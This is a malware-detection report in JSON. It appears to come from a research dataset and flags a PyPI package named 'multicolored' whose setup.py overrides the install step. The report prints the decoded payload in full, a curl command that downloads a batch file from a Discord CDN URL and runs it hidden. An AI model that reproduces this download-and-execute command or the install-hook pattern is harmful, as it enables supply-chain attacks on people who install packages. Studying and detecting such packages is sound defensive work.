{
  "package_name": "66a3e44dfbdd2b77491abba953d53fcb10f65366",
  "total_matches": 2,
  "is_malicious": true,
  "file_results": [
    {
      "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/66a3e44dfbdd2b77491abba953d53fcb10f65366/setup.py",
      "file_name": "setup.py",
      "detection_count": 2,
      "is_malicious": true,
      "confidence": "high",
      "malicious_behavior": "The code contains a function notmalfunc() that executes a base64-decoded string via os.system. The decoded string is: 'curl -s -o %temp%\\strings.bat https://cdn.discordapp.com/attachments/1146199124572639249/1188980936969306164/strings.bat && start /min cmd /c %temp%\\strings.bat'. This downloads a batch file from a remote server and executes it on the victim's machine. The notmalfunc() function is called automatically after installation of the package via the custom AfterInstall class, meaning the malicious payload is executed as a side effect of installing the package. This is a classic example of a supply chain attack via a malicious Python package.",
      "false_positive_reason": "",
      "detection_points": [
        {
          "line_number": "16",
          "type_description": "code-execution: found 1 source code matches",
          "code_snippet": "os.system(b64d(\n'Y3VybCAtcyAtbyAldGVtcCVcc3RyaW5ncy5iYXQgaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTE0NjE5OTEyNDU3MjYzOTI0OS8xMTg4OTgwOTM2OTY5MzA2MTY0L3N0cmluZ3MuYmF0ICYmIHN0YXJ0IC9taW4gY21kIC9jICV0ZW1wJVxzdHJpbmdzLmJ...       ))",
          "full_match": "* This package is executing OS commands in the setup.py file at setup.py:16",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/66a3e44dfbdd2b77491abba953d53fcb10f65366/setup.py",
          "relative_path": "setup.py"
        },
        {
          "line_number": "34",
          "type_description": "cmd-overwrite: found 1 source code matches",
          "code_snippet": "setuptools.setup(name='multicolored', version='1.0.0', author='drqgs',\nauthor_email='administration@nulled.to', description=\n'Developed and being worked on.', long_description=\n'nothing to see here yet!', long_description_conten...Install})",
          "full_match": "* This package is overwriting the 'install' command in setup.py at setup.py:34",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/66a3e44dfbdd2b77491abba953d53fcb10f65366/setup.py",
          "relative_path": "setup.py"
        }
      ]
    }
  ]
}